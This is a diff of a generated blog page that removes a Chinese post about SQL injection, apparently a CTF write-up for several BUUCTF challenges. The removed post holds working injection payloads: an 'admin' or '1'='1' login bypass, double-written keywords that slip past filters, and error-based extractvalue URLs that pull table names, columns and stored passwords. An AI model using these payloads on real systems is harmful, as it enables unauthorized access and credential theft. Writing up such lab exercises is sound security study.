 <h3 id="创建应用的具体步骤"><a href="#创建应用的具体步骤" class="headerlink" title="创建应用的具体步骤"></a>创建应用的具体步骤</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/nodejs/nodejs-http-server.html">https://www.runoob.com/nodejs/nodejs-http-server.html</a><br>具体操作：可行</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/01/SQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/02/01/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-02-01 17:54:11" itemprop="dateCreated datePublished" datetime="2021-02-01T17:54:11+08:00">2021-02-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-02-18 18:00:25" itemprop="dateModified" datetime="2021-02-18T18:00:25+08:00">2021-02-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="1-buu-SUCTF-2019-EasySQL"><a href="#1-buu-SUCTF-2019-EasySQL" class="headerlink" title="1.buu-[SUCTF 2019]EasySQL"></a>1.buu-[SUCTF 2019]EasySQL</h1><p><img src="images/buusql1.0.png" alt="buu-sql.png"><br>发现昨天用的堆叠注入可以直接查表<br><img src="images/buusql1.0.png" alt="buu-sql.png"><br>发现了表Flag,但是无法用show columns from Flag读取其中的列<br>好，看看大佬们的WP：“后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag，但作为一道题目，from一定是from flag”猜出后端源码select $_POST[‘query’] || flag from Flag,<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187</a><br>挺无语的，直接看大佬讲解吧<br>今天先搞别的        </p>
-<hr>
-<h1 id="buu-极客大挑战-2019-EasySQL"><a href="#buu-极客大挑战-2019-EasySQL" class="headerlink" title="buu-[极客大挑战 2019]EasySQL"></a>buu-[极客大挑战 2019]EasySQL</h1><p>进入靶机<br><img src="images/buusql2.0.png" alt="buu-sql.png"><br>用万能密码试一试<br><img src="images/buusql2.1.png" alt="buu-sql.png"><br>用户名和密码都输入   admin’ or ‘1’=’1<br>得到flag     </p>
-<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>先尝试万能密码登录，最后发现<br>?username=admin’–+&amp;password=1登陆成功  </p>
-<ul>
-<li>查字段<br>?username=admin’ order by 3–+&amp;password=1<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘der 3– ‘ and password=’1’’ at line 1，发现语句中order by 就剩der了，说明过滤了or和by,<br>双写绕过：?username=admin’ oorrder bbyy 4–+&amp;password=1</li>
-<li>查得有3个字段，开始联合查询<br>?username=-admin’ union select 1,2,3–+&amp;password=1找回显，<br>又有报错：check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1,2,3– ‘ and password=’1’’ at line 1<br>过滤了union 和 select，再双写绕过：<br>?username=-admin’ ununionion seselectlect 1,2,3–+&amp;password=1有回显  </li>
-<li>查当前数据库为geek,查该数据库的表：<br>?username=-admin’ ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=’geek’–+&amp;password=1，有报错：<br>check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘.tables table_schema=’geek’– ‘ and password=’1’’ at line 1<br>过滤了from和where，继续双写绕过<br>结果：Table ‘infmation_schema.tables’ doesn’t exist，<br>卧槽，小细节啊，上面过滤了or，所以information里面的or也要双写<br>（查所有数据库，查ctf里面的表，查Flag里面的列，查flag里面的字段）</li>
-</ul>
-<hr>
-<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>报错注入：  （过滤了空格，用括号代替）<br>查数据库</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></pre>
-<p>查表</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))%23</code></pre>
-<p>查字段</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code></pre>
-<p>查数据password</p>
-<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23</code></pre>
-<p>发现只爆一半</p>
-<pre><code>/check.php?username=admin&amp;password=admin%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code></pre>
-<p>left right查左右</p>
-<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>BP抓包fuzz，发现过滤了or xor = 等，<br>没过滤union select，可以查</p>
 
       
     </div>
@@ -1319,7 +1283,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
